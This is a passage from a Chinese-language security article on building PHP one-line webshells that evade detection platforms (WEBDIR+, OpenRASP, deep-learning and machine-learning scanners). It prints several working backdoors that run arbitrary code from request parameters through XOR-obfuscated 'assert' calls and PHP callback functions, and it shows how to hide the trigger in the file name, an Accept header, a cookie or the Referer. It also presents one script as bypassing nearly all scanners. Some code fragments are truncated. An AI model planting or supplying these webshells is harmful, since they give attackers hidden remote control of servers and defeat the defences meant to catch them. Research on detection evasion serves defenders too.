    $password = "LandGrey";
    ${"LandGrey"} = substr(__FILE__,-5,-4) . "class";
    $f = $LandGrey ^ hex2bin("12101f040107");
    array_intersect_uassoc (array($_REQUEST[$password] => ""), array(1), $f);
    ?>
脚本名必须是"***s.php"的名字形式，即最后一位字符要为"s"，然后用"sclass" 和
hex2bin("12101f040107")的值按位异或，得到"assert"，从而利用回调函数，执行PHP代码。
上传到WEBDIR+系统后，脚本被重命名，" **试执行时自然无法复现木马行为**
"，从而绕过了检测。这种方式有一种明显的要求，就是我们能够准确预知或控制脚本名的最后一位字符。
如果写成通用型脚本，根据文件名的最后一位字符，自动选择做异或的字符串，得到"assert"，代码示例如下：
     "51", "1" => "50", "2" => "53", "3" => "52", "4" => "55", "5" => "54", "6" => "57", "7" => "56", "8" => "59",
        "9" => "58", "a" => "00", "b" => "03", "c" => "02", "d" => "05", "e" => "04", "f" => "07", "g" => "06", "h" => "09",
        "i" => "08", "j" => "0b", "k" => "0a", "l" => "0d", "m" => "0c", "n" => "0f", "o" => "0e", "p" => "11", "q" => "10",
        "r" => "13", "s" => "12", "t" => "15", "u" => "14", "v" => "17", "w" => "16", "x" => "19", "y" => "18", "z" => "1b",
        "A" => "20", "B" => "23", "C" => "22", "D" => "25", "E" => "24", "F" => "27", "G" => "26", "H" => "29", "I" => "28",
        "J" => "2b", "K" => "2a", "L" => "2d", "M" => "2c", "N" => "2f", "O" => "2e", "P" => "31", "Q" => "30", "R" => "33",
        "S" => "32", "T" => "35", "U" => "34", "V" => "37", "W" => "36", "X" => "39", "Y" => "38", "Z" => "3b",
    );
    $f = pack("H*", $trick[$key]."3f120b1655") ^ $key."Land!";
    array_intersect_uassoc (array($_REQUEST[$password] => ""), array(1), $f);
    ?>
就如下图所示，会被查杀：
将脚本命名为scanner.php, 硬编码脚本最后一位字符为"r"，就不会被平台检测到，证明了我们原始的想法和对平台检测原理的部分推测:
     ""), array(1), $f);
    ?
#### 利用检测平台的信息缺失
接着猜想：当脚本在沙盒中运行时，如果得不到可以让脚本正常执行的关键信息，平台就无法查杀Webshell；而我们连接时，带上关键信息，就可以正常使用一句话木马后门，从而绕过查杀。
例如，利用下面的一句话，请求时，Cknife携带请求头`Accept: r`，密码输入"LandGrey"，即可成功连接一句话木马：
     ""), array(1), $f);
    ?>
#### 其它信息的差异
在针对某个特别的目标测试时，可以利用目标的特殊信息构造信息的差异，实现Webshell绕过。
如目标IP地址的唯一性、域名、特殊Cookie、Session字段和值、$_SERVER变量中可被控制的值，甚至是主机Web服务的根目录、操作系统等一些差别，发挥空间很大。
## 0x06：绕过深度学习技术的检测
当用0x05 " **1\. 利用重命名前后的脚本名不同** "中的脚本来测试时，被深度学习模型技术检测Webshell给查杀了。
但是基于免杀的回调函数，利用0x05给出的" **2\. 利用检测平台的信息缺失** "给出的一句话，仍然可以突破
webshell.cdxy.me平台的Webshell检测:
为了避免偶然，换个免杀函数，再测试一次。请求时设置Cookie值为`Cookie: set-domain-name=ass;`，以下示例脚本代码也可绕过该平台的查杀，当然，以上提到的其它工具和平台也可以绕过。
    = 5.4.0, PHP 7)
     *
     */
    $password = "LandGrey";
    $ch = $_COOKIE["set-domain-name"];
    array_intersect_ukey(array($_REQUEST[$password] => 1), array(1), $ch."ert");
    ?>
## 小插曲
在测试期间，还对河马机器学习查杀引擎  进行过测试，发现突破不了。测试中，发现连下面的正常语句都会被杀：
所以就将Wordpress的源码上传，测试下系统的可用性。1774个文件，发现了1494个疑似后门。系统的测试结果不能作为判断标准，所以正文中略过了对该平台的测试。
## 0x07: 彩蛋
最后再给出一个可以绕过当前市面上几乎所有Webshell查杀的PHP一句话木马脚本。请求时，设置Referer头，后面以"ass****"结尾即可,比如：`Referer:
http://www.target.com/ass.php`。
在使用Cknife时，注意软件实现有缺陷，会从第二个":"处截断，可改成`Referer: http%3a//www.target.com/ass.php`
    = 5.3.0, PHP 7)
     *
     */
    $password = "LandGrey";
    $wx = substr($_SERVER["HTTP_REFERER"],-7,-4);
    forward_static_call_array($wx."ert", array($_REQUEST[$password]));
    ?>
## 0x08: 后记
文章的" **0x04: 绕过传统检测** "研究结果表明：对于基于 **陌生的回调函数后门** 构造的一句话后门 **脚本本身**
，传统的基于特征、正则表达式和黑名单制的查杀技术，已经失去了对抗PHP Webshell检测的意义。
" **0x05: 突破OpenRASP WebShell沙盒检测** "、" **0x06: 绕过深度学习技术的检测** "和" **小插曲**
"部分的研究结果表名：新型的沙盒技术、深度学习、机器学习查杀平台还不够成熟和稳定，虽然在 **检测未知的一句话木马方面表现领先于传统检测方式**
，但是经过研究，还是可以构造出绕过查杀的PHP一句话木马脚本。
文章以上研究都是对PHP一句话 **木马脚本本身** 的免杀研究。文章发布后，以上多个回调函数后门估计很快会被加入黑名单。
要注意对于实际应用中，脚本本身免杀只是第一步，WAF和查杀软件可能会根据脚本的创建日期、文件大小、通信流量特征等多个方面，动态、综合的判断脚本是否为恶意Webshell，本文并未涉及。
## 0x09: 参考文档